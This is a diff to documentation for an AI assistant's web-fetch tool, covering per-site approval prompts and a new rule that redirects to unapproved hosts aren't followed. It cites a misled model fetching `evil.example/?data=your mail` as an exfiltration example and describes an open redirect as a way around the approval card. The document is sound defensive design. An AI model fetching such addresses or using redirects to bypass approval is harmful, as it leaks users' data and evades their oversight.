@@ -58,8 +58,11 @@ tool stays and answers that it's off, and a conversation that used it gets it ba
 **Asking you.** An address can carry data out: a model misled by a page could fetch `evil.example/?data=your mail`.
 So the first fetch from each site in a conversation asks you, and the card shows the full address. Once allowed, that
 site doesn't ask again in the conversation (a redirect to another host doesn't allow that host); a new conversation
-asks again. Allow everything doesn't ask; Allow read-only commands and Allow file edits still ask, because this sends
-something out rather than reading your computer. Scheduled tasks and chat channels follow their own approval mode.
+asks again. A redirect is followed only to the same host or to a site already allowed in this conversation. A redirect
+to any other site isn't followed, and its name isn't even looked up: the model is told where it pointed and has to fetch
+that address itself, which asks you the first time. Otherwise an open redirect on a site you allowed (`/go?to=…`)
+could carry an address the model made up to a site that never appeared on a card. Allow everything doesn't ask; Allow
+read-only commands and Allow file edits still ask, because this sends something out rather than reading your computer. Scheduled tasks and chat channels follow their own approval mode.
 Text in the page that looks like a key is masked like any other tool result, and rewinding a turn counts a fetch as
 "only looked".
 
